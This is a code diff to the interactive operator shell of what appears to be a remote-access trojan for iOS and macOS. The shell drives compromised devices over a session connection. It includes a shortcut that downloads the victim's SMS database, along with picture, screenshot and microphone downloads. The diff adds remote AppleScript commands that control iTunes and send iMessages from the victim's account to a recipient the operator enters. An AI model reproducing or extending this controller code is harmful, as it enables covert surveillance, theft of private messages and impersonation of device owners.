@@ -7,17 +7,13 @@ from src.helper.helper import Helper
 
 class ESShell:
     def __init__(self):
-        self.iswin = sys.platform.startswith('win')
-        self.CMD_CLEAR = 'cls' if self.iswin else 'clear'
-        self.CMD_LS = 'dir' if self.iswin else 'ls'
-        self.CMD_PWD = 'cd' if self.iswin else 'pwd'
         self.h = Helper()
     
-    def showHelp(self,CDA,multisession):
+    def showHelp(self,CDA,multiserver):
         def showCommand(cmd,desc):
             print cmd + " " * (15 - len(cmd)) + ": " + desc
         print "\n"+self.h.WHITEBU+"Local Commands:"+"\n"+self.h.ENDC
-        if multisession:
+        if multiserver:
             showCommand("back", "detach from session")
             showCommand("exit", "detach and close session")
         showCommand("lls","list contents of local directory")
@@ -98,7 +94,7 @@ class ESShell:
             showCommand("locationservice","turn on or off location services")
             print ""
     
-    def interact(self,session,server,multisession=0):
+    def interact(self,session,server,multiserver=0):
         self.h.strinfo("type \"help\" for commands")
         iosshortcuts = {
             "getsms":"download /var/mobile/Library/SMS/sms.db",
@@ -141,23 +137,41 @@ class ESShell:
                 if args[0] == "picture" or args[0] == "screenshot":
                     server.downloadFile(command,session.conn)
                     continue
+                #MARK: TODO// osascript modules, allow people to easily create commands
+                elif args[0] == "play":
+                    server.sendCommand("esrunosa tell application \"iTunes\" to play",session.conn)
+                    continue
+                elif args[0] == "pause":
+                    server.sendCommand("esrunosa tell application \"iTunes\" to pause",session.conn)
+                    continue
+                elif args[0] == "imessage":
+                    to = raw_input("Send to: ")
+                    message = raw_input("Message: ")
+                    message = message.replace("\\","\\\\")
+                    message = message.replace("\"","\\\"")
+                    server.sendCommand("""esrunosa tell application "Messages"
+                        set targetService to 1st service whose service type = iMessage
+                        set targetBuddy to buddy \""""+to+"""\" of targetService
+                        send \""""+message+"""\" to targetBuddy
+                        end tell""",session.conn)
+                    continue
             #mutually exclusive
             if args[0] == "help":
-                self.showHelp(session.CDA,multisession)
+                self.showHelp(session.CDA,multiserver)
             elif args[0] == "download" or (args[0] == "mic" and len(args) >= 2 and args[1] == "stop"):
                 server.downloadFile(command,session.conn)
             elif args[0] == "clear":
-                os.system(self.CMD_CLEAR);
+                os.system(self.h.CMD_CLEAR);
             elif args[0] == "lopen":
                 if len(command.split()) == 1:
                     print "Usage: lopen localdirectory"
                 else:
-                    if self.iswin:
+                    if self.h.iswin:
                         print "Not supported on windows."
                     else:
                         os.system('open ' + command[5:])
             elif args[0] == "lls":
-                os.system(self.CMD_LS + " " + command[len(self.CMD_LS)+1:])
+                os.system(self.h.CMD_LS + " " + command[len(self.h.CMD_LS)+1:])
             elif args[0] == "lcd":
                 if len(command.split()) == 1:
                     print "Usage: lcd localdirectory"
@@ -167,8 +181,8 @@ class ESShell:
                     except:
                         self.h.strinfo("directory not found")
             elif args[0] == "lpwd":
-                os.system(self.CMD_PWD)
-            elif args[0] == "back" and multisession:
+                os.system(self.h.CMD_PWD)
+            elif args[0] == "back" and multiserver:
                 return
             elif args[0] == "exit":
                 return -1
